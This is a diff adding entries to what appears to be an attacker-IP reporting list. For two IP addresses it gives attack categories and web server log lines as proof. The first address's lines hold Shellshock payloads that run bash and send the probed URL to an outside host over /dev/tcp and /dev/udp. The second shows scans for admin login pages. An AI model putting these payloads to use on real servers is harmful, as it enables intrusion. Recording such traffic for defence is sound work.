@@ -1,0 +1,18 @@
+ips:
+  '129.121.182.100':
+    categories: ['exploitfinder.shellshock', 'attacks.80']
+    proof: [ # DON'T RUN THESE COMMANDS.
+        "129.121.182.100 - - [27/Feb/2015:07:44:04 +0000] \"GET /cgi-bin/php? HTTP/1.1\" 404 1453 \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php? > /dev/udp/213.233.161.42/80\"\" \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php? > /dev/udp/213.233.161.42/80\"\""
+        "sh -c \"echo APERTRON.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\"\"cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\"\" \"() { :;}; /bin/b"
+        "129.121.182.100 - - [27/Feb/2015:07:44:04 +0000] \"GET /cgi-bin/php5? HTTP/1.1\" 404 1457 \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php5? > /dev/udp/213.233.161.42/80\"\" \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php5? > /dev/udp/213.233.161.42/80\"\""
+        "129.121.182.100 - - [27/Feb/2015:07:44:04 +0000] \"GET /phppath/php? HTTP/1.1\" 404 1453 \"() { :;}; /bin/bash -c \"echo APERTRON.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/phppath/php? > /dev/udp/213.233.161.42/80\"\" \"() { :;}; /bin/bash -c \"echo APERTRON.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/phppath/php? > /dev/udp/213.233.161.42/80\"\""
+        "129.121.182.100 - - [27/Feb/2015:07:44:04 +0000] \"GET /cgi-bin/php5-cli? HTTP/1.1\" 404 1473 \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80\"\" \"() { :;}; /bin/bash -c \"echo APERTRON.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23; echo APERTRON.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80\"\""
+    ]
+  '104.236.255.234':
+    categories: ['adminpanelfinder', 'attacks.80']
+    proof: [
+      "104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] \"GET /wp-login.php HTTP/1.0\" 503 1020 \"-\" \"-\""
+      "104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] \"GET /administrator/index.php HTTP/1.0\" 503 1020 \"-\" \"-\""
+      "104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] \"GET /user HTTP/1.0\" 404 1013 \"-\" \"-\""
+      "104.236.255.234 - - [04/Mar/2015:10:10:34 +0000] \"GET /admin.php HTTP/1.0\" 503 1020 \"-\" \"-\""
+      ]
